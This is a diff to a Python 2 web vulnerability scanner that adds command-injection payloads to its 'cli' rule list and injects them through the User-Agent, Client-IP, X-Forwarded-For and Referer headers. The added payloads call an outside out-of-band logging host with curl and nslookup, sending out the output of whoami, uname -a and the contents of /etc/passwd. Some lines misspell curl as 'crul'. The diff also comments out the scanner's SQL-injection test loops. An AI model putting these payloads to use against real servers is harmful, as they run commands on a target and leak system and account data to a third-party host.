@@ -34,6 +34,7 @@ v1版本，不保证稳定性，只操作GET型的XSS， payload可以自己添�
 """
 
 requests.packages.urllib3.disable_warnings()
+# logging.getLogger('request')
 
 _random=str(random.randint(300,182222))
 # logging.basicConfig(level=logging.INFO,
@@ -66,7 +67,11 @@ XSS_Rule = {
         "nslookup {domain}.devil.yoyostay.top|nslookup {domain}.devil.yoyostay.top&nslookup {domain}.devil.yoyostay.top",
         # "'nslookup {domain}|nslookup {domain}&nslookup {domain}'",
         # '"nslookup {domain}|nslookup {domain}&nslookup {domain}"',
-        ";nslookup {domain}.devil.yoyostay.top|nslookup {domain}.devil.yoyostay.top&nslookup {domain}.devil.yoyostay.top;"
+        ";nslookup {domain}.devil.yoyostay.top|nslookup {domain}.devil.yoyostay.top&nslookup {domain}.devil.yoyostay.top;",
+        "$(curl http://`whoami`{domain}.wiwqng.ceye.io)",
+        '&curl http://`whoami`{domain}.wiwqng.ceye.io/`uname -a`/&\'\\"`0&nslookup {domain}.wiwqng.ceye.io&`\'',
+        "crul http://curl{domain}.wiwqng.ceye.io/`cat /etc/passwd`|nslookup {domain}.wiwqng.ceye.io&nslookup {domain}.wiwqng.ceye.io",
+        ";crul http://{domain}.wiwqng.ceye.io/|crul http://{domain}.wiwqng.ceye.io/&crul http://{domain}.wiwqng.ceye.io/;",
     ],
     'ssti' : [
         '{{1357924680 * 2468013579}}',
@@ -236,26 +241,29 @@ def start_point(args):
             print "User killed"
             break
 
-    for index in dict_links.keys():
-        item = dict_links[index]
-        url = item['url']
-        headers = item['headers']
-        data = item['data'] if 'data' in item else None
-        time_result = SQLInjectionTime(url, headers=headers, data=data)
-        if time_result:
-            outqueue.put(('SQLInjection Time', 'awvs', url))
+    # for index in dict_links.keys():
+    #     item = dict_links[index]
+    #     url = item['url']
+    #     headers = item['headers']
+    #     data = item['data'] if 'data' in item else None
+    #     try:
+    #         time_result = SQLInjectionTime(url, headers=headers, data=data).startTest()
+    #         if time_result:
+    #             outqueue.put(('SQLInjection Time', 'awvs', url))
+    #     except Exception as e:
+    #         continue
 
 
 
-    for index in dict_links.keys():
-        item = dict_links[index]
-        url = item['url']
-        headers = item['headers']
-        data = item['data'] if 'data' in item else None
-        time.sleep(3)
-        aim_error_list = sqli_test(url, headers, data)
-        for i in aim_error_list:
-            print "[+] [{}]:\t".format(i[0]) + Fore.GREEN + "Found SQLi Error-Based Injection=> url:{} =>data:{}".format(i[1], i[2])  + Style.RESET_ALL
+    # for index in dict_links.keys():
+    #     item = dict_links[index]
+    #     url = item['url']
+    #     headers = item['headers']
+    #     data = item['data'] if 'data' in item else None
+    #     time.sleep(3)
+    #     aim_error_list = sqli_test(url, headers, data)
+    #     for i in aim_error_list:
+    #         print "[+] [{}]:\t".format(i[0]) + Fore.GREEN + "Found SQLi Error-Based Injection=> url:{} =>data:{}".format(i[1], i[2])  + Style.RESET_ALL
 
 
 
@@ -373,10 +381,10 @@ class detectXSS(threading.Thread):
             cli_payloads = copy.copy(XSS_Rule['cli'])
             cli_payloads = [p.replace('{domain}', domain) for p in cli_payloads]
             for payload in cli_payloads:
-                hj.headers['User-Agent'] = real_headers['User-Agent'] + payload
-                hj.headers['Client-IP'] = real_headers['Client-IP'] + payload
-                hj.headers['X-Forwarded-For'] = real_headers['X-Forwarded-For'] + payload
-                hj.headers['Referer'] = real_headers['Referer'] + payload
+                hj.headers['User-Agent'] = real_headers['User-Agent'] + "UA" +  payload
+                hj.headers['Client-IP'] = real_headers['Client-IP'] + "ClientIP" +payload
+                hj.headers['X-Forwarded-For'] = real_headers['X-Forwarded-For'] +  "XFF" + payload
+                hj.headers['Referer'] = real_headers['Referer'] + "Refer"+ payload
                 hj.request()
 
 
